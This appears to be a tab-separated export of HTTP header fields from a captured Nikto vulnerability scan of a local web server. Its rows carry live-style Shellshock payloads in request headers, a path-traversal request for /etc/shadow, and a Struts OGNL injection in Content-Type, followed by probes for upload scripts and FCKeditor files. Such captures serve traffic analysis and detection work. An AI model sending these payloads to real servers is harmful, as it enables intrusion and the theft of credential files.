http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																	Keep-Alive										192.168.1.101									623					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/defaultwebpage.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/defaultwebpage.cgi
																	Keep-Alive										192.168.1.101									625					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/download.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/download.cgi
																	Keep-Alive										192.168.1.101									627					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/entropysearch.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/entropysearch.cgi
																	Keep-Alive										192.168.1.101									629					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/env.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/env.cgi
																	Keep-Alive										192.168.1.101									631					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/environment.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/environment.cgi
																	Keep-Alive										192.168.1.101									633					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/ezmlm-browse		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ezmlm-browse
																	Keep-Alive										192.168.1.101									635					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/formmail.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/formmail.cgi
																	Keep-Alive										192.168.1.101									637					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/FormMail-clone.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/FormMail-clone.cgi
																	Keep-Alive										192.168.1.101									639					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/guestbook.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/guestbook.cgi
																	Keep-Alive										192.168.1.101									641					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/helpdesk.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/helpdesk.cgi
																	Keep-Alive										192.168.1.101									642					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/index.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/index.cgi
																	Keep-Alive										192.168.1.101									643					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/index.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/index.php
																	Keep-Alive										192.168.1.101									644					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/index.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/index.pl
																	Keep-Alive										192.168.1.101									645					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/info.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/info.cgi
																	Keep-Alive										192.168.1.101									646					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/info.sh		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/info.sh
																	Keep-Alive										192.168.1.101									647					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/loadpage.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/loadpage.cgi
																	Keep-Alive										192.168.1.101									648					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/login.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/login.cgi
																	Keep-Alive										192.168.1.101									649					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/login.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/login.php
																	Keep-Alive										192.168.1.101									650					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/login.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/login.pl
																	Keep-Alive										192.168.1.101									651					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/pathtest.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/pathtest.pl
																	Keep-Alive										192.168.1.101									652					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/php
																	Keep-Alive										192.168.1.101									653					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/php4		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/php4
																	Keep-Alive										192.168.1.101									654					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/php5		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/php5
																	Keep-Alive										192.168.1.101									655					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/php-cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/php-cgi
																	Keep-Alive										192.168.1.101									656					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/php.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/php.cgi
																	Keep-Alive										192.168.1.101									657					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/php.fcgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/php.fcgi
																	Keep-Alive										192.168.1.101									658					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/printenv		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/printenv
																	Keep-Alive										192.168.1.101									659					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/restore_config.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/restore_config.cgi
																	Keep-Alive										192.168.1.101									660					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/ruby.rb		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ruby.rb
																	Keep-Alive										192.168.1.101									661					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/search		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/search
																	Keep-Alive										192.168.1.101									662					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/search.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/search.cgi
																	Keep-Alive										192.168.1.101									663					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/server.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/server.php
																	Keep-Alive										192.168.1.101									664					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/status		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/status
																	Keep-Alive										192.168.1.101									665					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/sysinfo.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/sysinfo.pl
																	Keep-Alive										192.168.1.101									666					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test
																	Keep-Alive										192.168.1.101									667					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test-cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test-cgi
																	Keep-Alive										192.168.1.101									668					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test.cgi
																	Keep-Alive										192.168.1.101									669					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test_cgi.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test_cgi.php
																	Keep-Alive										192.168.1.101									670					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test.cgi.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test.cgi.php
																	Keep-Alive										192.168.1.101									671					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test_cgi.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test_cgi.pl
																	Keep-Alive										192.168.1.101									672					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test-cgi.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test-cgi.pl
																	Keep-Alive										192.168.1.101									673					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test.py		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test.py
																	Keep-Alive										192.168.1.101									674					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test.sh		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test.sh
																	Keep-Alive										192.168.1.101									675					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/tmUnblock.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/tmUnblock.cgi
																	Keep-Alive										192.168.1.101									676					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/uname.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/uname.cgi
																	Keep-Alive										192.168.1.101									677					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/viewcvs.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/viewcvs.cgi
																	Keep-Alive										192.168.1.101									678					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/welcome		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/welcome
																	Keep-Alive										192.168.1.101									679					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/whois.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/whois.cgi
																	Keep-Alive										192.168.1.101									680					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/
																	Keep-Alive										192.168.1.101									681						1	http://192.168.1.101/web/../../../../../../../../../../../../etc/shadow		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:dishwasher)				/web/../../../../../../../../../../../../etc/shadow
																	Keep-Alive				%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('Nikto-Added-CVE-2017-5638',7*6)}.multipart/form-data						192.168.1.101															1	http://192.168.1.101/web/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:strutshock)				/web/
																	Keep-Alive				%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('Nikto-Added-CVE-2017-5638',7*6)}.multipart/form-data						192.168.1.101									687						1	http://192.168.1.101/web/index.action		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:strutshock)				/web/index.action
																	Keep-Alive				%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('Nikto-Added-CVE-2017-5638',7*6)}.multipart/form-data						192.168.1.101									690						1	http://192.168.1.101/web/login.action		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:strutshock)				/web/login.action
																	Keep-Alive										192.168.1.101									692						1	http://192.168.1.101/web/cfappman/index.cfm		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000013)				/web/cfappman/index.cfm
																	Keep-Alive										192.168.1.101									694						1	http://192.168.1.101/web/cfdocs/examples/cvbeans/beaninfo.cfm		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000014)				/web/cfdocs/examples/cvbeans/beaninfo.cfm
																	Keep-Alive										192.168.1.101									696						1	http://192.168.1.101/web/cfdocs/examples/parks/detail.cfm		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000015)				/web/cfdocs/examples/parks/detail.cfm
																	Keep-Alive										192.168.1.101									698						1	http://192.168.1.101/web/kboard/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000016)				/web/kboard/
																	Keep-Alive										192.168.1.101									700						1	http://192.168.1.101/web/lists/admin/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000017)				/web/lists/admin/
																	Keep-Alive										192.168.1.101									702						1	http://192.168.1.101/web/splashAdmin.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000018)				/web/splashAdmin.php
																	Keep-Alive										192.168.1.101									704						1	http://192.168.1.101/web/ssdefs/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000019)				/web/ssdefs/
																	Keep-Alive										192.168.1.101									706						1	http://192.168.1.101/web/sshome/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000020)				/web/sshome/
																	Keep-Alive										192.168.1.101									708						1	http://192.168.1.101/web/tiki/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000021)				/web/tiki/
																	Keep-Alive										192.168.1.101									710						1	http://192.168.1.101/web/tiki/tiki-install.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000022)				/web/tiki/tiki-install.php
																	Keep-Alive										192.168.1.101									712						1	http://192.168.1.101/web/scripts/samples/details.idc		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000023)				/web/scripts/samples/details.idc
																	Keep-Alive										192.168.1.101									713						1	http://192.168.1.101/web/administrator/gallery/uploadimage.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000200)				/web/administrator/gallery/uploadimage.php
																	Keep-Alive										192.168.1.101									714						1	http://192.168.1.101/web/pafiledb/includes/team/file.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000201)				/web/pafiledb/includes/team/file.php
																	Keep-Alive										192.168.1.101									715						1	http://192.168.1.101/web/phpEventCalendar/file_upload.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000202)				/web/phpEventCalendar/file_upload.php
																	Keep-Alive										192.168.1.101									716						1	http://192.168.1.101/web/servlet/com.unify.servletexec.UploadServlet		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000203)				/web/servlet/com.unify.servletexec.UploadServlet
																	Keep-Alive										192.168.1.101									717						1	http://192.168.1.101/web/scripts/cpshost.dll		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000205)				/web/scripts/cpshost.dll
																	Keep-Alive										192.168.1.101									718						1	http://192.168.1.101/web/scripts/repost.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000206)				/web/scripts/repost.asp
																	Keep-Alive										192.168.1.101									719						1	http://192.168.1.101/web/upload.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000207)				/web/upload.asp
																	Keep-Alive										192.168.1.101									720						1	http://192.168.1.101/web/uploadn.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000208)				/web/uploadn.asp
																	Keep-Alive										192.168.1.101									721						1	http://192.168.1.101/web/uploadx.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000209)				/web/uploadx.asp
																	Keep-Alive										192.168.1.101									722						1	http://192.168.1.101/web/wa.exe		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000210)				/web/wa.exe
																	Keep-Alive										192.168.1.101									723						1	http://192.168.1.101/web/axis-cgi/buffer/command.cgi		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001374)				/web/axis-cgi/buffer/command.cgi
																	Keep-Alive										192.168.1.101									724						1	http://192.168.1.101/web/upload.cgi+		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001405)				/web/upload.cgi+
																	Keep-Alive										192.168.1.101									725						1	http://192.168.1.101/web/fckeditor/editor/filemanager/upload/test.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003558)				/web/fckeditor/editor/filemanager/upload/test.html
																	Keep-Alive										192.168.1.101									726						1	http://192.168.1.101/web/FCKeditor/editor/filemanager/upload/test.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003558)				/web/FCKeditor/editor/filemanager/upload/test.html
																	Keep-Alive										192.168.1.101									727						1	http://192.168.1.101/web/Script/fckeditor/editor/filemanager/upload/test.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003558)				/web/Script/fckeditor/editor/filemanager/upload/test.html
																	Keep-Alive										192.168.1.101									728						1	http://192.168.1.101/web/sites/all/modules/fckeditor/fckeditor/editor/filemanager/upload/test.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003558)				/web/sites/all/modules/fckeditor/fckeditor/editor/filemanager/upload/test.html
																	Keep-Alive										192.168.1.101									729						1	http://192.168.1.101/web/modules/fckeditor/fckeditor/editor/filemanager/upload/test.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003558)				/web/modules/fckeditor/fckeditor/editor/filemanager/upload/test.html
																	Keep-Alive										192.168.1.101									730						1	http://192.168.1.101/web/class/fckeditor/editor/filemanager/upload/test.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003558)				/web/class/fckeditor/editor/filemanager/upload/test.html
																	Keep-Alive										192.168.1.101									731						1	http://192.168.1.101/web/inc/fckeditor/editor/filemanager/upload/test.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003558)				/web/inc/fckeditor/editor/filemanager/upload/test.html
																	Keep-Alive										192.168.1.101									732						1	http://192.168.1.101/web/sites/all/libraries/fckeditor/editor/filemanager/upload/test.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003558)				/web/sites/all/libraries/fckeditor/editor/filemanager/upload/test.html
																	Keep-Alive										192.168.1.101									733						1	http://192.168.1.101/web/js/editor/fckeditor/editor/filemanager/upload/test.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003558)				/web/js/editor/fckeditor/editor/filemanager/upload/test.html
																	Keep-Alive										192.168.1.101									734						1	http://192.168.1.101/web/includes/fckeditor/editor/filemanager/upload/test.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003558)				/web/includes/fckeditor/editor/filemanager/upload/test.html
																	Keep-Alive										192.168.1.101									735						1	http://192.168.1.101/web/include/fckeditor/editor/filemanager/upload/test.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003558)				/web/include/fckeditor/editor/filemanager/upload/test.html
																	Keep-Alive										192.168.1.101									736						1	http://192.168.1.101/web/modules/fckeditor/editor/filemanager/upload/test.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003558)				/web/modules/fckeditor/editor/filemanager/upload/test.html
																	Keep-Alive										192.168.1.101									737						1	http://192.168.1.101/web/plugins/fckeditor/editor/filemanager/upload/test.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003558)				/web/plugins/fckeditor/editor/filemanager/upload/test.html
																	Keep-Alive										192.168.1.101									738						1	http://192.168.1.101/web/fckeditor/editor/dialog/fck_image.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003559)				/web/fckeditor/editor/dialog/fck_image.html
																	Keep-Alive										192.168.1.101									739						1	http://192.168.1.101/web/FCKeditor/editor/dialog/fck_image.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003559)				/web/FCKeditor/editor/dialog/fck_image.html
																	Keep-Alive										192.168.1.101									740						1	http://192.168.1.101/web/Script/fckeditor/editor/dialog/fck_image.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003559)				/web/Script/fckeditor/editor/dialog/fck_image.html
																	Keep-Alive										192.168.1.101									741						1	http://192.168.1.101/web/sites/all/modules/fckeditor/fckeditor/editor/dialog/fck_image.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003559)				/web/sites/all/modules/fckeditor/fckeditor/editor/dialog/fck_image.html
																	Keep-Alive										192.168.1.101									742						1	http://192.168.1.101/web/modules/fckeditor/fckeditor/editor/dialog/fck_image.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003559)				/web/modules/fckeditor/fckeditor/editor/dialog/fck_image.html
																	Keep-Alive										192.168.1.101									743						1	http://192.168.1.101/web/class/fckeditor/editor/dialog/fck_image.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003559)				/web/class/fckeditor/editor/dialog/fck_image.html
																	Keep-Alive										192.168.1.101									744						1	http://192.168.1.101/web/inc/fckeditor/editor/dialog/fck_image.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003559)				/web/inc/fckeditor/editor/dialog/fck_image.html
																	Keep-Alive										192.168.1.101									745						1	http://192.168.1.101/web/sites/all/libraries/fckeditor/editor/dialog/fck_image.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003559)				/web/sites/all/libraries/fckeditor/editor/dialog/fck_image.html
																	Keep-Alive										192.168.1.101									746						1	http://192.168.1.101/web/js/editor/fckeditor/editor/dialog/fck_image.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003559)				/web/js/editor/fckeditor/editor/dialog/fck_image.html
																	Keep-Alive										192.168.1.101									747						1	http://192.168.1.101/web/includes/fckeditor/editor/dialog/fck_image.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003559)				/web/includes/fckeditor/editor/dialog/fck_image.html
																	Keep-Alive										192.168.1.101									748						1	http://192.168.1.101/web/include/fckeditor/editor/dialog/fck_image.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003559)				/web/include/fckeditor/editor/dialog/fck_image.html
